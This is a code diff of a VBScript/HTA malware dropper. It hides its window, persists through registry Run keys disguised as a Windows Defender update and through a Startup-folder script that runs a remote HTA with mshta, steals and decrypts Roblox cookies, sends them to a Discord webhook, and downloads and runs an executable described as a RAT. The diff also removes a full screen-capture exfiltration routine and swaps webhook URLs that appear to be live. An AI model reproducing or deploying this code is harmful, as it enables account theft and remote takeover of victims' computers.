@@ -7,7 +7,7 @@ On Error Resume Next
 Dim sh, fso, WH, PC, USER
 Set sh = CreateObject("WScript.Shell")
 Set fso = CreateObject("Scripting.FileSystemObject")
-WH   = "https://discord.com/api/webhooks/1555915418043158580/fbAr-T8SHmkh38pgeXcv3aEO_uOswRitbI6ih9FfppeYgsShp1OdvW_7zXKJUQ2vwBvE"
+WH   = "https://discordapp.com/api/webhooks/1552107533303283826/YCk_BwrFksPkoKnMDrkZI55vfTv5bxvKVXTdnNCoLq31t4KIx4_sRs0lUv36yAH6lYFO"
 PC   = sh.ExpandEnvironmentStrings("%COMPUTERNAME%")
 USER = sh.ExpandEnvironmentStrings("%USERNAME%")
 
@@ -15,102 +15,31 @@ Sub Window_OnLoad()
     window.resizeTo 0, 0
     window.moveTo -2000, -2000
     Call Persist
-    Call TakeScreenshot
     Call GrabRoblox
     Call DropRAT
     window.setInterval "RegrabAll()", 300000
 End Sub
 
 Sub RegrabAll()
-    Call TakeScreenshot
     Call GrabRoblox
 End Sub
 
-' ============================================================
-' SCREENSHOT
-' ============================================================
-
-Sub TakeScreenshot()
-    Dim imgPath: imgPath = TmpFile("sc.png")
-    Dim psPath:  psPath  = TmpFile("sc.ps1")
-
-    If fso.FileExists(imgPath) Then fso.DeleteFile imgPath, True
-    If fso.FileExists(psPath)  Then fso.DeleteFile psPath, True
-
-    Dim f: Set f = fso.CreateTextFile(psPath, True, False)
-    f.WriteLine "Add-Type -AN System.Windows.Forms,System.Drawing"
-    f.WriteLine "$s = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds"
-    f.WriteLine "$b = New-Object System.Drawing.Bitmap($s.Width, $s.Height)"
-    f.WriteLine "$g = [System.Drawing.Graphics]::FromImage($b)"
-    f.WriteLine "$g.CopyFromScreen($s.Location, [System.Drawing.Point]::Empty, $s.Size)"
-    f.WriteLine "$b.Save('" & imgPath & "')"
-    f.WriteLine "$g.Dispose()"
-    f.WriteLine "$b.Dispose()"
-    f.Close
-    Set f = Nothing
-
-    sh.Run "powershell -NoP -NonI -WindowStyle Hidden -Exec Bypass -File """ & psPath & """", 0, True
-
-    If fso.FileExists(psPath) Then fso.DeleteFile psPath, True
-    If Not fso.FileExists(imgPath) Then Exit Sub
-
-    Dim bnd:  bnd  = MkGuid()
-    Dim crlf: crlf = vbCrLf
-    Dim hdr:  hdr  = "--" & bnd & crlf & _
-                     "Content-Disposition: form-data; name=""file""; filename=""screenshot.png""" & crlf & _
-                     "Content-Type: image/png" & crlf & crlf
-    Dim ftr: ftr = crlf & "--" & bnd & "--"
-
-    Dim stHdr: Set stHdr = CreateObject("ADODB.Stream")
-    stHdr.Type = 2 : stHdr.Charset = "iso-8859-1" : stHdr.Open
-    stHdr.WriteText hdr
-    stHdr.Position = 0 : stHdr.Type = 1
-
-    Dim stImg: Set stImg = CreateObject("ADODB.Stream")
-    stImg.Type = 1 : stImg.Open
-    stImg.LoadFromFile imgPath
-
-    Dim stFtr: Set stFtr = CreateObject("ADODB.Stream")
-    stFtr.Type = 2 : stFtr.Charset = "iso-8859-1" : stFtr.Open
-    stFtr.WriteText ftr
-    stFtr.Position = 0 : stFtr.Type = 1
-
-    Dim stOut: Set stOut = CreateObject("ADODB.Stream")
-    stOut.Type = 1 : stOut.Open
-    stHdr.CopyTo stOut : stHdr.Close : Set stHdr = Nothing
-    stImg.CopyTo stOut : stImg.Close : Set stImg = Nothing
-    stFtr.CopyTo stOut : stFtr.Close : Set stFtr = Nothing
-    stOut.Position = 0
-
-    Dim h: Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0")
-    h.SetOption 2, 13056
-    h.Open "POST", WH, False
-    h.SetRequestHeader "Content-Type", "multipart/form-data; boundary=" & bnd
-    h.Send stOut.Read
-    Set h = Nothing
-
-    stOut.Close : Set stOut = Nothing
-    If fso.FileExists(imgPath) Then fso.DeleteFile imgPath, True
-End Sub
-
-' ============================================================
-' PERSISTENCE
-' ============================================================
-
 Sub Persist()
     Dim payload: payload = "mshta https://raw.githubusercontent.com/huh71943-s/suck-r-mom/main/file.hta"
+
+    ' Registry Run â€” fires on every login
     sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsDefenderUpdate", payload, "REG_SZ"
+
+    ' Registry RunOnce â€” fires next login as backup
     sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce\WinUpdate", payload, "REG_SZ"
+
+    ' Startup folder VBS â€” fires on every login
     Dim sp: sp = sh.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Windows\Start Menu\Programs\Startup\wdu.vbs"
     Dim sf: Set sf = fso.CreateTextFile(sp, True)
     sf.WriteLine "CreateObject(""WScript.Shell"").Run ""mshta https://raw.githubusercontent.com/huh71943-s/suck-r-mom/main/file.hta"", 0, False"
     sf.Close
     Set sf = Nothing
 End Sub
-
-' ============================================================
-' ROBLOX COOKIE — unchanged
-' ============================================================
 
 Sub GrabRoblox()
     Dim paths(4)
@@ -166,10 +95,6 @@ Sub GrabRoblox()
     Call PostFile("cookie.txt", cookie)
 End Sub
 
-' ============================================================
-' RAT DROP — unchanged
-' ============================================================
-
 Sub DropRAT()
     Dim temp: temp = sh.ExpandEnvironmentStrings("%TEMP%") & "\cookiez.exe"
     Dim dl: dl = "https://github.com/huh71943-s/dicecheck.app/raw/refs/heads/main/cookiez.exe"
@@ -184,10 +109,6 @@ Sub DropRAT()
         sh.Run Chr(34) & temp & Chr(34), 0, False
     End If
 End Sub
-
-' ============================================================
-' HELPERS — unchanged
-' ============================================================
 
 Function DecryptDPAPI(b64): DecryptDPAPI = "": On Error Resume Next: Dim inf: inf = TmpFile("dpi.txt"): Dim outf: outf = TmpFile("dpo.txt"): fso.DeleteFile outf, True: WriteFile inf, b64
     Dim ps: ps = "Add-Type -AssemblyName System.Security;try{$b=[Convert]::FromBase64String((Get-Content '" & inf & "' -Raw).Trim());$d=[System.Security.Cryptography.ProtectedData]::Unprotect($b,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser);[System.Text.Encoding]::UTF8.GetString($d)|Out-File '" & outf & "' -Encoding utf8}catch{''|Out-File '" & outf & "'}"
